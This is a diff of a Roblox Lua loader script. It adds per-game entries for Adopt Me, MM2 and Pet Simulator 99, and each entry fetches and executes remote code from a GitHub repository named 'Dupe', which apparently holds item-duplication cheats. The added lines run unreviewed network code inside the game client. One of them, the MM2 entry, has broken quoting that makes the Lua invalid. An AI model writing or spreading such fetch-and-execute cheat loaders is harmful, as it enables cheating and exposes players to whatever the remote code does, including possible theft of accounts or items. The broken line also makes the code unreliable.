@@ -1,10 +1,10 @@
 repeat task.wait() until game:IsLoaded()
 
 local Games = {
-    [920587237] = "", -- Adopt Me
+    [920587237] = "loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/AdoptMe'))()", -- Adopt Me
     [18901165922] = "", -- PSG
-    [142823291] = "", -- MM2
-    [8737899170] = "" -- PS99
+    [142823291] = "loadstring(game:HttpGet("https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Mm2"))()", -- MM2
+    [8737899170] = "loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/PetSim99'))()" -- PS99
 }
 
 for i, v in pairs(Games) do
